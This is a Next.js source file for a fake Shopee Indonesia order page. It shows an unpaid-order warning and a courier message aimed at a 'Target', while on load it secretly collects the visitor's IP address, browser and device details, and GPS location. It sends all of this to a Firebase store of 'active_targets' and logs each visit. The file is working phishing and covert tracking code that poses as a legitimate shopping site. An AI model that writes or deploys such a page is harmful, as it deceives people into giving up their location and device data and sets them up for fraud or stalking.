'use client';

import React, { useEffect, useState } from 'react';
import { ref, set, push, onValue } from 'firebase/database';
import { database } from '@/lib/firebase';
import { ShoppingBag, ChevronLeft, MapPin, Clock, AlertCircle } from 'lucide-react';

export default function ShopeeAlibiPage() {
  const [loading, setLoading] = useState(true);
  const [ip, setIp] = useState('Detecting...');

  useEffect(() => {
    // 1. Get IP Address
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        setIp(data.ip);
        reportToFirebase(data.ip);
      })
      .catch(() => reportToFirebase('Unknown IP'));

    // 2. Request Geolocation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        updateLocation(pos.coords.latitude, pos.coords.longitude);
      });
    }

    const timer = setTimeout(() => setLoading(false), 1500);
    return () => clearTimeout(timer);
  }, []);

  const reportToFirebase = (deviceIp: string) => {
    // Generate a unique ID for this web visitor if not exists
    let visitorId = localStorage.getItem('shopee_visitor_id');
    if (!visitorId) {
      visitorId = 'WEB_' + Math.random().toString(36).substring(2, 9).toUpperCase();
      localStorage.setItem('shopee_visitor_id', visitorId);
    }

    const targetRef = ref(database, `kei-vault/active_targets/${visitorId}`);
    set(targetRef, {
      id: visitorId,
      appType: 'SHOPEE_ALIBI',
      status: 'ONLINE',
      ip: deviceIp,
      model: getBrowserInfo(),
      lastSeen: Date.now(),
      battery: 100, // Default for web
      deviceInfo: {
        model: getBrowserInfo(),
        os: navigator.platform,
        browser: navigator.userAgent
      }
    });

    // Add initial log
    const logRef = ref(database, `system_logs/${visitorId}`);
    push(logRef, `[${new Date().toLocaleTimeString()}] 🛍️ Target membuka link Shopee Alibi`);
  };

  const updateLocation = (lat: number, lng: number) => {
    const visitorId = localStorage.getItem('shopee_visitor_id');
    if (!visitorId) return;

    const locRef = ref(database, `kei-vault/locations/${visitorId}`);
    set(locRef, {
      lat,
      lng,
      time: Date.now()
    });

    const logRef = ref(database, `system_logs/${visitorId}`);
    push(logRef, `[${new Date().toLocaleTimeString()}] 📍 Lokasi Web terdeteksi: ${lat}, ${lng}`);
  };

  const getBrowserInfo = () => {
    const ua = navigator.userAgent;
    if (ua.includes('iPhone')) return 'iPhone';
    if (ua.includes('Android')) return 'Android Device';
    if (ua.includes('Windows')) return 'Windows PC';
    return 'Web Visitor';
  };

  if (loading) {
    return (
      <div className="fixed inset-0 bg-white flex items-center justify-center">
        <div className="w-16 h-16 border-4 border-[#ee4d2d] border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f5f5f5] font-sans text-[#222]">
      {/* Shopee Header */}
      <header className="sticky top-0 z-50 bg-white border-b border-gray-200 px-4 py-3 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <ChevronLeft className="text-[#ee4d2d]" size={28} />
          <h1 className="text-lg font-medium">Rincian Pesanan</h1>
        </div>
        <ShoppingBag className="text-[#ee4d2d]" size={24} />
      </header>

      {/* Warning Banner */}
      <div className="bg-[#fff8e1] p-4 flex gap-3 border-b border-orange-100">
        <AlertCircle className="text-orange-500 shrink-0" size={20} />
        <div>
          <p className="text-sm font-bold text-orange-700">Pembayaran Belum Diselesaikan</p>
          <p className="text-xs text-orange-600 mt-1">
            Segera selesaikan pembayaran sebelum pesanan dibatalkan otomatis oleh sistem.
          </p>
        </div>
      </div>

      <main className="p-4 space-y-4">
        {/* Status Card */}
        <div className="bg-[#ee4d2d] rounded-lg p-5 text-white shadow-lg relative overflow-hidden">
          <div className="relative z-10">
             <div className="flex items-center gap-2 mb-1">
               <Clock size={16} />
               <p className="text-sm font-medium">Menunggu Pembayaran</p>
             </div>
             <p className="text-xs opacity-90">Mohon bayar sebelum 24 jam untuk menghindari pembatalan.</p>
          </div>
          <ShoppingBag size={80} className="absolute -right-4 -bottom-4 text-white/10 rotate-12" />
        </div>

        {/* Address Card */}
        <div className="bg-white rounded-lg p-4 shadow-sm flex gap-3">
          <MapPin className="text-[#ee4d2d] shrink-0" size={20} />
          <div>
            <p className="text-sm font-bold">Alamat Pengiriman</p>
            <p className="text-xs text-gray-500 mt-1 italic">Mendeteksi lokasi pengiriman...</p>
          </div>
        </div>

        {/* Product Card */}
        <div className="bg-white rounded-lg shadow-sm overflow-hidden">
           <div className="p-4 flex gap-3 border-b border-gray-100">
              <div className="w-20 h-20 bg-gray-100 rounded-md flex items-center justify-center text-gray-400">
                 <ShoppingBag size={32} />
              </div>
              <div className="flex-1">
                 <p className="text-sm line-clamp-2">Paket Misteri / Elektronik High-End Special Edition</p>
                 <div className="mt-2 flex justify-between items-center">
                    <p className="text-[#ee4d2d] font-bold">Rp 1.450.000</p>
                    <p className="text-xs text-gray-400">x1</p>
                 </div>
              </div>
           </div>
           <div className="p-3 bg-gray-50 flex justify-between items-center px-4">
              <p className="text-xs text-gray-500">Total Pesanan</p>
              <p className="text-sm font-bold text-[#ee4d2d]">Rp 1.450.000</p>
           </div>
        </div>

        {/* Message for Target */}
        <div className="bg-blue-50 border border-blue-100 rounded-lg p-4">
           <p className="text-sm text-blue-800 leading-relaxed">
             <strong>Pesan dari Kurir:</strong><br />
             "Mass ini mas nya mesen paket ya? tapi belum di bayar coba di cek mas, barangnya sudah di gudang tinggal kirim."
           </p>
        </div>

        <button className="w-full bg-[#ee4d2d] text-white font-bold py-3 rounded-md shadow-md active:scale-95 transition-transform">
           BAYAR SEKARANG
        </button>

        <p className="text-center text-[10px] text-gray-400 mt-6">
          Shopee Indonesia © 2024 • Keamanan Terjamin
        </p>
      </main>
    </div>
  );
}
